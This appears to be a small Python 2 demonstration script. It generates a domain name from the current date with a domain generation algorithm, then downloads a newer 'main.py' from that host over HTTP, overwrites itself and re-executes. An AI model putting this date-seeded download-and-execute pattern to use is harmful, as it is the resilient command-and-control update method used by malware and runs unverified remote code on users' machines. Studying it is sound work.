from distutils.version import StrictVersion
import time
import urllib
import sys
import os

version = "1.1"

def generate_domain(year, month, day):
  """ Generates a domain by considering the current date. """
  domain = ""
 
  for i in range(21):
    year = ((year ^ 8 * year) >> 11) ^ ((year & 0xFFFFFFF0) << 17)
    month = ((month ^ 4 * month) >> 25) ^ 16 * (month & 0xFFFFFFF8)
    day = ((day ^ (day << 13)) >> 19) ^ ((day & 0xFFFFFFFE) << 12)
    domain += chr(((year ^ month ^ day) % 25) + 97)
 
  # add our own domain
  domain += '.alexandreamel'
 
  return domain

def update(domain):
  """
  Download and restart itself by replacing the program script file if not using
  the latest version. This is basically a self-modifying code, which updates itself
  if needed.
  """
  global version

  # download the latest version of the script
  ver = urllib.urlopen('http://' + domain + '/dga_version.txt').read()
  if StrictVersion(ver) > StrictVersion(version):
    urllib.urlretrieve('http://' + domain + '/main.py', 'main.py')
    print "The main.py was successfully updated."
  else:
    print "Updating not required - using the latest version."
    return
 
  # restart the program if it was updated
  os.execl(sys.executable, *([sys.executable]+sys.argv))


def main():
    year = int(time.strftime("%Y"))
    month = int(time.strftime("%m"))
    day = int(time.strftime("%d"))

    print year, month, day
    domain = generate_domain(year, month, day)
    print "attempting update..."
    update(domain)



if __name__ == "__main__":
    main()
